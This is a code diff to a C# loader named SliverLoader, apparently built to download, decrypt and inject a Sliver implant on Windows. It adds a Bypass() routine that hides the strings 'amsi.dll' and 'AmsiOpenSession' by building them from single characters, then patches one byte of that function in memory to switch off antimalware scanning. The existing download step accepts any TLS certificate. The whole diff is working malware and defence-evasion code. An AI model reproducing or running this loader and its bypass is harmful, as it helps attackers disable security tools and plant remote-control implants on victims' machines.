@@ -7,14 +7,12 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 using System.IO.Compression;
+using System.Diagnostics;
 
 namespace SliverLoader
 {
     public class Loader
     {
-        private static string AESKey;
-        private static string AESIV;
-
         [StructLayout(LayoutKind.Sequential)]
         public class SecurityAttributes
         {
@@ -112,6 +110,9 @@ namespace SliverLoader
         [DllImport("kernel32.dll")]
         public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
 
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
+
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
@@ -127,8 +128,27 @@ namespace SliverLoader
         [DllImport("kernel32.dll")]
         static extern UInt32 FlsAlloc(IntPtr lpCallback);
 
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool CloseHandle(IntPtr hObject);
+
         private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
         private static UInt32 MEM_COMMIT = 0x1000;
+
+        private static int PROCESS_VM_OPERATION = 0x0008;
+        private static int PROCESS_VM_READ = 0x0010;
+        private static int PROCESS_VM_WRITE = 0x0020;
 
         public static void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm, byte[] AESKey, byte[] AESIV)
         {
@@ -152,7 +172,7 @@ namespace SliverLoader
                 return;
             }
 
-            // Add amsi bypass here
+            Bypass();
 
             ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
             System.Net.WebClient client = new WebClientWithTimeout();
@@ -269,6 +289,55 @@ namespace SliverLoader
                 wr.Timeout = 50000000; // timeout in milliseconds (ms)
                 return wr;
             }
+        }
+        static int Bypass()
+        {
+            Char c1, c2, c3, c4, c5, c6, c7, c8, c9, c10;
+            c1 = 'A';
+            c2 = 's';
+            c3 = 'c';
+            c4 = 'n';
+            c5 = 'l';
+            c6 = 't';
+            c7 = 'z';
+            c8 = 'U';
+            c9 = 'y';
+            c10 = 'o';
+            string[] filePaths = Directory.GetFiles(@"c:\wind" + c10 + "ws\\s" + c9 + "stem32", "a?s?.d*");
+            string libname = (filePaths[0].Substring(filePaths[0].Length - 8));
+
+            byte patch = 0xEB;
+
+            IntPtr hHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, Process.GetCurrentProcess().Id);
+            if (hHandle != IntPtr.Zero)
+            {
+                Console.WriteLine("[+] Process opened with Handle ~> " + hHandle);
+            }
+
+            IntPtr amsiDLL = LoadLibrary(libname);
+            if (amsiDLL != IntPtr.Zero)
+            {
+                Console.WriteLine("[+] amsi.dll located at ~> " + amsiDLL);
+            }
+
+            IntPtr amsiOpenSession = GetProcAddress(amsiDLL, c1 + "m" + c2 + "iOpenSe" + c2 + c2 + "io" + c4);
+            if (amsiOpenSession != IntPtr.Zero)
+            {
+                Console.WriteLine("[+] AmsiOpenSession located at ~> " + amsiOpenSession);
+            }
+
+            IntPtr patchAddr = (IntPtr)(amsiOpenSession.ToInt64() + 3);
+            Console.WriteLine("[+] Trying to Inject ~> " + patchAddr);
+
+            int bytesWritten = 0;
+            bool result = WriteProcessMemory(hHandle, patchAddr, new byte[] { patch }, 1, out bytesWritten);
+            if (result)
+            {
+                Console.WriteLine("[!] Process Memory Injected!");
+            }
+
+            CloseHandle(hHandle);
+            return 0;
         }
     }
 }
